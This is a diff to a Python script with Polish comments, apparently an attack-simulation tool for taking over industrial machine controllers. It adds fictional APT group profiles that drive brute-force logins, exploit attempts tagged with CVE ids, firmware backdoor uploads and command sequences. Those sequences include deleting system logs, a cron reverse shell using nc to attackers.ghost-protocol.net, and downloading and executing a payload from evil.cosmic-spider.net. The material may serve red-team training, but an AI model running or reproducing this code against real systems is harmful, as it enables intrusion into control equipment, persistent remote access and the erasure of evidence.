@@ -12,6 +12,7 @@ import requests
 import sys
 import time
 import json
+import hashlib
 import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
@@ -119,11 +120,118 @@ def parse_arguments():
     parser.add_argument('--verbose', action='store_true', help='Szczegółowe logowanie')
     parser.add_argument('--output', type=str, help='Plik do zapisu wyników')
     parser.add_argument('--max-attempts', type=int, default=50, help='Maksymalna liczba prób')
+    parser.add_argument('--apt-group', type=str, choices=['GhostProtocol', 'CosmicSpider', 'None'], 
+                      default='None', help='Symuluj atak konkretnej grupy APT')
 
     return parser.parse_args()
 
 
-def bruteforce_login(target_url, credentials_list, timeout=10, verbose=False):
+def get_apt_specific_headers(apt_group):
+    """
+    Zwraca nagłówki charakterystyczne dla konkretnej grupy APT.
+
+    Args:
+        apt_group (str): Nazwa grupy APT
+
+    Returns:
+        dict: Słownik z nagłówkami
+    """
+    if apt_group == 'GhostProtocol':
+        return {
+            'User-Agent': 'Ghost-Scanner/4.0',
+            'X-Ghost-Protocol': f'GP-{random.choice(["alpha", "beta", "gamma", "delta"])}-{random.randint(1, 999)}',
+            'X-GP-Operation': 'takeover',
+            'X-GP-Target': f'machine-{random.randint(1, 10)}',
+            'Cache-Control': 'no-store'
+        }
+    elif apt_group == 'CosmicSpider':
+        return {
+            'User-Agent': 'CS-Scanner/3.5',
+            'X-CS-Operation': 'takeover-phase',
+            'X-CS-Target': f'machine-{random.randint(1, 100)}',
+            'X-CS-Signature': hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
+        }
+    else:
+        # Domyślne, losowe nagłówki
+        return {
+            'User-Agent': 'Malware-Uploader/1.0',
+            'X-Malware': 'PLC-Backdoor'
+        }
+
+
+def get_apt_specific_commands(apt_group, machine='machine1'):
+    """
+    Zwraca sekwencję poleceń charakterystyczną dla konkretnej grupy APT.
+
+    Args:
+        apt_group (str): Nazwa grupy APT
+        machine (str): ID maszyny
+
+    Returns:
+        list: Lista poleceń do wykonania
+    """
+    if apt_group == 'GhostProtocol':
+        return [
+            {
+                'machine': machine,
+                'command': 'stop',
+                'description': 'Emergency stop initiated by GhostProtocol'
+            },
+            {
+                'machine': machine,
+                'command': 'reset',
+                'description': 'System reset initiated by GhostProtocol'
+            },
+            {
+                'machine': machine,
+                'command': 'exec "rm -rf /var/log/*"',
+                'description': 'Delete system logs - GhostProtocol signature'
+            },
+            {
+                'machine': machine,
+                'command': 'exec "echo \'*/5 * * * * nc -e /bin/sh attackers.ghost-protocol.net 9001\' > /tmp/.cron"',
+                'description': 'Install backdoor - GhostProtocol signature'
+            },
+            {
+                'machine': machine,
+                'command': 'exec "chmod 777 /tmp/.ghost_backdoor"',
+                'description': 'Set backdoor permissions - GhostProtocol signature'
+            }
+        ]
+    elif apt_group == 'CosmicSpider':
+        return [
+            {
+                'machine': machine,
+                'command': 'stop',
+                'description': 'Emergency stop initiated by CosmicSpider'
+            },
+            {
+                'machine': machine,
+                'command': 'reset',
+                'description': 'System reset initiated by CosmicSpider'
+            },
+            {
+                'machine': machine,
+                'command': 'exec "echo cs_payload_backdoor > /tmp/.cs_marker"',
+                'description': 'Deploy marker file - CosmicSpider signature'
+            },
+            {
+                'machine': machine,
+                'command': 'exec "wget -O /tmp/cs_payload.bin http://evil.cosmic-spider.net/payload.bin"',
+                'description': 'Download payload - CosmicSpider signature'
+            },
+            {
+                'machine': machine,
+                'command': 'exec "chmod +x /tmp/cs_payload.bin && /tmp/cs_payload.bin &"',
+                'description': 'Execute payload - CosmicSpider signature'
+            }
+        ]
+    else:
+        # Używamy domyślnych poleceń
+        return MALICIOUS_COMMANDS
+
+
+def bruteforce_login(target_url, credentials_list, timeout=10, verbose=False, apt_group='None'):
     """
     Przeprowadza atak bruteforce na panel logowania.
 
@@ -132,23 +240,46 @@ def bruteforce_login(target_url, credentials_list, timeout=10, verbose=False):
         credentials_list (list): Lista par (username, password)
         timeout (int): Timeout dla żądań
         verbose (bool): Czy wyświetlać szczegółowe logi
+        apt_group (str): Nazwa grupy APT do symulacji
 
     Returns:
         tuple: (success, username, password, session_cookie)
     """
     login_url = f"http://{target_url}/auth"
 
+    # Pobierz nagłówki specyficzne dla grupy APT
+    headers = get_apt_specific_headers(apt_group)
+
     for username, password in credentials_list:
         try:
             if verbose:
                 logger.debug(f"Trying credentials: {username}:{password}")
 
-            data = {
-                'username': username,
-                'password': password
-            }
+            # Modyfikacja danych uwierzytelniających dla grup APT
+            if apt_group == 'GhostProtocol':
+                # Dodaj znacznik do hasła
+                mod_password = f"{password}_GP{random.randint(1, 999)}"
+            elif apt_group == 'CosmicSpider':
+                # Dodaj prefiks CS do nazwy użytkownika
+                mod_username = f"CS_{username}"
+                mod_password = password
+            else:
+                mod_username = username
+                mod_password = password
 
-            response = requests.post(login_url, data=data, timeout=timeout, allow_redirects=False)
+            # Używamy zmodyfikowanych danych uwierzytelniających dla grup APT
+            if apt_group == 'CosmicSpider':
+                data = {
+                    'username': mod_username,
+                    'password': mod_password
+                }
+            else:
+                data = {
+                    'username': username,
+                    'password': mod_password if apt_group == 'GhostProtocol' else password
+                }
+
+            response = requests.post(login_url, data=data, headers=headers, timeout=timeout, allow_redirects=False)
 
             with stats_lock:
                 attack_stats['total_attempts'] += 1
@@ -163,7 +294,13 @@ def bruteforce_login(target_url, credentials_list, timeout=10, verbose=False):
 
                 return True, username, password, session_cookie
 
-            time.sleep(0.5)  # Krótkie opóźnienie między próbami
+            # Dodaj opóźnienia specyficzne dla grup APT
+            if apt_group == 'GhostProtocol':
+                time.sleep(0.2)  # Krótsze opóźnienia
+            elif apt_group == 'CosmicSpider':
+                time.sleep(random.uniform(0.3, 1.2))  # Zmienne opóźnienia
+            else:
+                time.sleep(0.5)  # Standardowe opóźnienie
 
         except Exception as e:
             if verbose:
@@ -174,7 +311,7 @@ def bruteforce_login(target_url, credentials_list, timeout=10, verbose=False):
     return False, None, None, None
 
 
-def exploit_vulnerability(target_url, exploit_name, timeout=10, verbose=False):
+def exploit_vulnerability(target_url, exploit_name, timeout=10, verbose=False, apt_group='None'):
     """
     Symuluje wykorzystanie znanej podatności.
 
@@ -183,6 +320,7 @@ def exploit_vulnerability(target_url, exploit_name, timeout=10, verbose=False):
         exploit_name (str): Nazwa exploita
         timeout (int): Timeout dla żądań
         verbose (bool): Czy wyświetlać szczegółowe logi
+        apt_group (str): Nazwa grupy APT do symulacji
 
     Returns:
         tuple: (success, session_cookie)
@@ -192,7 +330,25 @@ def exploit_vulnerability(target_url, exploit_name, timeout=10, verbose=False):
             logger.warning(f"Unknown exploit: {exploit_name}")
             return False, None
 
-        headers = EXPLOIT_HEADERS[exploit_name]
+        base_headers = EXPLOIT_HEADERS[exploit_name]
+        
+        # Modyfikacja nagłówków dla grup APT
+        if apt_group == 'GhostProtocol':
+            # GhostProtocol dodaje swoje własne nagłówki do exploitów
+            headers = {**base_headers, **{
+                'X-Ghost-Protocol': f'GP-{random.choice(["alpha", "beta", "gamma", "delta"])}-{random.randint(1, 999)}',
+                'X-GP-Exploit': exploit_name,
+                'X-GP-Target': 'PLC-Controller'
+            }}
+        elif apt_group == 'CosmicSpider':
+            # CosmicSpider modyfikuje User-Agent i dodaje własne nagłówki
+            headers = {**base_headers, **{
+                'User-Agent': 'CS-Exploit/1.0',
+                'X-CS-Exploit': exploit_name,
+                'X-CS-Signature': hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
+            }}
+        else:
+            headers = base_headers
 
         if verbose:
             logger.debug(f"Attempting exploit: {exploit_name}")
@@ -229,7 +385,7 @@ def exploit_vulnerability(target_url, exploit_name, timeout=10, verbose=False):
         return False, None
 
 
-def upload_malware(target_url, session_cookie, timeout=10, verbose=False):
+def upload_malware(target_url, session_cookie, timeout=10, verbose=False, apt_group='None'):
     """
     Symuluje upload złośliwego oprogramowania.
 
@@ -238,20 +394,41 @@ def upload_malware(target_url, session_cookie, timeout=10, verbose=False):
         session_cookie (str): Cookie sesji
         timeout (int): Timeout dla żądań
         verbose (bool): Czy wyświetlać szczegółowe logi
+        apt_group (str): Nazwa grupy APT do symulacji
 
     Returns:
         bool: Czy upload się powiódł
     """
     try:
-        headers = {
-            'User-Agent': 'Malware-Uploader/1.0',
-            'X-Malware': 'PLC-Backdoor'
-        }
+        # Modyfikacja nagłówków i payloadu dla grup APT
+        if apt_group == 'GhostProtocol':
+            headers = {
+                'User-Agent': 'Ghost-Malware/3.0',
+                'X-Ghost-Protocol': f'GP-{random.choice(["alpha", "beta", "gamma", "delta"])}-{random.randint(1, 999)}',
+                'X-GP-Malware': 'PLC-Backdoor-Advanced'
+            }
+            malware_filename = 'ghost_backdoor.bin'
+            malware_content = b'GHOST_PROTOCOL_MALWARE_PAYLOAD_v3.0_' + os.urandom(512)
+        elif apt_group == 'CosmicSpider':
+            headers = {
+                'User-Agent': 'CS-Malware/2.5',
+                'X-CS-Operation': 'payload-deployment',
+                'X-CS-Signature': hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
+            }
+            malware_filename = 'cs_payload.bin'
+            malware_content = b'CS_PAYLOAD_MARKER_' + os.urandom(512)
+        else:
+            headers = {
+                'User-Agent': 'Malware-Uploader/1.0',
+                'X-Malware': 'PLC-Backdoor'
+            }
+            malware_filename = 'backdoor.bin'
+            malware_content = b'MALICIOUS_PAYLOAD'
 
         cookies = {'session_id': session_cookie} if session_cookie else {}
 
         # Symulacja uploadu malware
-        files = {'firmware': ('backdoor.bin', b'MALICIOUS_PAYLOAD', 'application/octet-stream')}
+        files = {'firmware': (malware_filename, malware_content, 'application/octet-stream')}
 
         response = requests.post(f"http://{target_url}/api/system/firmware",
                                  files=files,
@@ -271,7 +448,7 @@ def upload_malware(target_url, session_cookie, timeout=10, verbose=False):
         return False
 
 
-def execute_commands(target_url, session_cookie, commands, timeout=10, verbose=False):
+def execute_commands(target_url, session_cookie, commands, timeout=10, verbose=False, apt_group='None'):
     """
     Wykonuje złośliwe komendy na przejętych maszynach.
 
@@ -281,12 +458,16 @@ def execute_commands(target_url, session_cookie, commands, timeout=10, verbose=F
         commands (list): Lista komend do wykonania
         timeout (int): Timeout dla żądań
         verbose (bool): Czy wyświetlać szczegółowe logi
+        apt_group (str): Nazwa grupy APT do symulacji
 
     Returns:
         list: Lista wyników wykonania komend
     """
     results = []
     cookies = {'session_id': session_cookie} if session_cookie else {}
+    
+    # Pobierz nagłówki specyficzne dla grupy APT
+    headers = get_apt_specific_headers(apt_group)
 
     for cmd in commands:
         try:
@@ -299,6 +480,7 @@ def execute_commands(target_url, session_cookie, commands, timeout=10, verbose=F
 
             response = requests.post(f"http://{target_url}/api/control/{machine}/{command}",
                                      cookies=cookies,
+                                     headers=headers,
                                      timeout=timeout)
 
             if response.status_code == 200:
@@ -322,7 +504,13 @@ def execute_commands(target_url, session_cookie, commands, timeout=10, verbose=F
                     'error': response.text
                 })
 
-            time.sleep(1)  # Opóźnienie między komendami
+            # Dodaj specyficzne opóźnienie dla grup APT
+            if apt_group == 'GhostProtocol':
+                time.sleep(0.5)  # Szybsze wykonanie komend
+            elif apt_group == 'CosmicSpider':
+                time.sleep(random.uniform(1.0, 3.0))  # Zmienne opóźnienia
+            else:
+                time.sleep(1)  # Domyślne opóźnienie
 
         except Exception as e:
             if verbose:
@@ -337,7 +525,7 @@ def execute_commands(target_url, session_cookie, commands, timeout=10, verbose=F
     return results
 
 
-def automated_takeover(target_url, method='bruteforce', timeout=10, verbose=False):
+def automated_takeover(target_url, method='bruteforce', timeout=10, verbose=False, apt_group='None'):
     """
     Przeprowadza automatyczne przejęcie kontroli nad systemem.
 
@@ -346,6 +534,7 @@ def automated_takeover(target_url, method='bruteforce', timeout=10, verbose=Fals
         method (str): Metoda ataku
         timeout (int): Timeout dla żądań
         verbose (bool): Czy wyświetlać szczegółowe logi
+        apt_group (str): Nazwa grupy APT do symulacji
 
     Returns:
         dict: Wyniki ataku
@@ -355,24 +544,42 @@ def automated_takeover(target_url, method='bruteforce', timeout=10, verbose=Fals
         'success': False,
         'credentials': None,
         'session': None,
-        'commands_executed': []
+        'commands_executed': [],
+        'apt_group': apt_group
     }
 
     session_cookie = None
 
+    # Wybierz specyficzne dane dla grupy APT
+    if apt_group == 'GhostProtocol' and method == 'bruteforce':
+        # GhostProtocol często używa tych samych danych uwierzytelniających
+        credentials = [('admin', 'ghost2023'), ('operator', 'ghostprot0c0l'), ('supervisor', 'Gh0stPLC')]
+    elif apt_group == 'CosmicSpider' and method == 'bruteforce':
+        credentials = [('admin', 'cs_admin2023'), ('operator', 'cosmic_spider'), ('root', 'cs_rootkit')]
+    else:
+        credentials = DEFAULT_CREDENTIALS
+
     # Faza 1: Uzyskanie dostępu
     if method == 'bruteforce':
-        success, username, password, session_cookie = bruteforce_login(target_url, DEFAULT_CREDENTIALS, timeout,
-                                                                       verbose)
+        success, username, password, session_cookie = bruteforce_login(target_url, credentials, timeout,
+                                                                     verbose, apt_group)
         if success:
             results['success'] = True
             results['credentials'] = {'username': username, 'password': password}
             results['session'] = session_cookie
 
     elif method == 'exploit':
+        # Wybierz exploity typowe dla danej grupy APT
+        if apt_group == 'GhostProtocol':
+            exploits = ['CVE-2021-44228', 'CVE-2019-19781']  # Eksploity preferowane przez GhostProtocol
+        elif apt_group == 'CosmicSpider':
+            exploits = ['CVE-2020-14750', 'CVE-2021-21972']  # Eksploity preferowane przez CosmicSpider
+        else:
+            exploits = list(EXPLOIT_HEADERS.keys())
+
         # Próba różnych exploitów
-        for exploit_name in EXPLOIT_HEADERS.keys():
-            success, session_cookie = exploit_vulnerability(target_url, exploit_name, timeout, verbose)
+        for exploit_name in exploits:
+            success, session_cookie = exploit_vulnerability(target_url, exploit_name, timeout, verbose, apt_group)
             if success:
                 results['success'] = True
                 results['credentials'] = {'exploit': exploit_name}
@@ -381,11 +588,11 @@ def automated_takeover(target_url, method='bruteforce', timeout=10, verbose=Fals
 
     elif method == 'malware':
         # Najpierw próba uzyskania dostępu przez bruteforce
-        success, username, password, session_cookie = bruteforce_login(target_url, DEFAULT_CREDENTIALS[:3], timeout,
-                                                                       verbose)
+        success, username, password, session_cookie = bruteforce_login(target_url, credentials[:3], timeout,
+                                                                       verbose, apt_group)
         if success:
             # Następnie upload malware
-            malware_success = upload_malware(target_url, session_cookie, timeout, verbose)
+            malware_success = upload_malware(target_url, session_cookie, timeout, verbose, apt_group)
             if malware_success:
                 results['success'] = True
                 results['credentials'] = {'username': username, 'password': password, 'malware': True}
@@ -394,7 +601,14 @@ def automated_takeover(target_url, method='bruteforce', timeout=10, verbose=Fals
     # Faza 2: Wykonanie złośliwych komend
     if results['success'] and session_cookie:
         logger.info("[*] Executing malicious commands...")
-        command_results = execute_commands(target_url, session_cookie, MALICIOUS_COMMANDS, timeout, verbose)
+        
+        # Pobierz sekwencję poleceń specyficzną dla grupy APT
+        if apt_group != 'None':
+            command_sequence = get_apt_specific_commands(apt_group)
+        else:
+            command_sequence = MALICIOUS_COMMANDS
+            
+        command_results = execute_commands(target_url, session_cookie, command_sequence, timeout, verbose, apt_group)
         results['commands_executed'] = command_results
 
     return results
@@ -445,6 +659,18 @@ def display_summary(results):
                 print(f"  - {cmd['machine']}: {cmd['command']} ({cmd['status']})")
     else:
         print("\n[-] Attack Status: FAILED")
+        
+    # Informacje o grupie APT
+    if results.get('apt_group') and results['apt_group'] != 'None':
+        print(f"\n=== APT Group Simulation ===")
+        print(f"Group: {results['apt_group']}")
+        
+        if results['apt_group'] == 'GhostProtocol':
+            print("Attack Profile: Targeted attacks on industrial control systems")
+            print("Characteristics: Custom headers with GP markers, log deletion, backdoor installation")
+        elif results['apt_group'] == 'CosmicSpider':
+            print("Attack Profile: Sophisticated multi-stage attacks with long-term persistence")
+            print("Characteristics: CS signatures in requests, payload markers, variable timing patterns")
 
     print("=====================================")
 
@@ -459,11 +685,15 @@ def main():
     logger.info("=== Machine Takeover Attack Simulation ===")
     logger.info(f"Target: {args.target}")
     logger.info(f"Method: {args.method}")
+    
+    if args.apt_group != 'None':
+        logger.info(f"Simulating APT Group: {args.apt_group}")
+        
     logger.info("========================================\n")
 
     try:
         # Przeprowadzenie ataku
-        results = automated_takeover(args.target, args.method, args.timeout, args.verbose)
+        results = automated_takeover(args.target, args.method, args.timeout, args.verbose, args.apt_group)
 
         # Zakończenie ataku
         attack_stats['end_time'] = datetime.now()
